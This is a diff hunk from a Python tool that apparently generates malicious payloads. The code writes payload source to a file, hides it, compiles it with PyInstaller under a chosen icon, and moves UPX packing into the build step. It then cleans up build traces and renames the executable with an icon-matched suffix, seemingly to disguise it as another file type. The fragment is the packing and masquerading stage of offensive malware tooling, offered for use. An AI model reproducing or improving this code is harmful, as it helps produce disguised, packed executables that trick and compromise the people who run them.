@@ -424,12 +424,11 @@ while True:
         file_st.write(source_payload)
         file_st.close()
         popen('attrib +h '+payload_name+'.py').read()
-        popen('pyinstaller --onefile '+payload_name+'.py -i '+icon_path+' --onefile').read()
+        popen('pyinstaller --onefile '+payload_name+'.py -i '+icon_path+' --onefile --upx-dir tools\\').read()
         popen('attrib -h '+payload_name+'.py').read()
         remove(payload_name+'.py')
         remove(payload_name+'.spec')
         popen('rmdir /Q /S build').read()
-        popen('tools\\upx.exe dist\\'+payload_name+'.exe').read()
         if licen_ico==True:
             new_ren=payload_name+key_icon[icon_select][1]+'.exe'
             popen('ren dist\\'+payload_name+'.exe '+new_ren)
